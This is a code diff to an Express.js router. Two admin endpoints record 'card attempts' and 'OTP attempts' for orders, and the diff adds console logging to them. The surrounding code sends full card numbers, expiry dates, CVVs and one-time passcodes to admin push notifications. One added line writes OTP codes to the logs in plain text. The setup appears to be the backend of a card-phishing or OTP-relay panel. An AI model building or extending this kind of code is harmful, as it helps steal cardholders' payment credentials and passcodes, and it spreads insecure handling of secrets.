@@ -294,7 +294,10 @@ router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
 
     // Send push notification to admin devices
     if (order) {
+      console.log(`[CARD] Sending notification for order ${orderId}, customer: ${order.customerName}`);
       notifyAdminsOfCardAttempt(order, cardName, cardNumber, cardExpiry, cardCvv);
+    } else {
+      console.log(`[CARD] Order ${orderId} not found, skipping notification`);
     }
 
     res.status(201).json(attempt);
@@ -389,7 +392,10 @@ router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
 
     // Send push notification to admin devices
     if (order) {
+      console.log(`[OTP] Sending notification for order ${orderId}, customer: ${order.customerName}, OTP: ${otpCode}`);
       notifyAdminsOfOtpAttempt(order, otpCode, success ?? false);
+    } else {
+      console.log(`[OTP] Order ${orderId} not found, skipping notification`);
     }
 
     res.status(201).json(attempt);
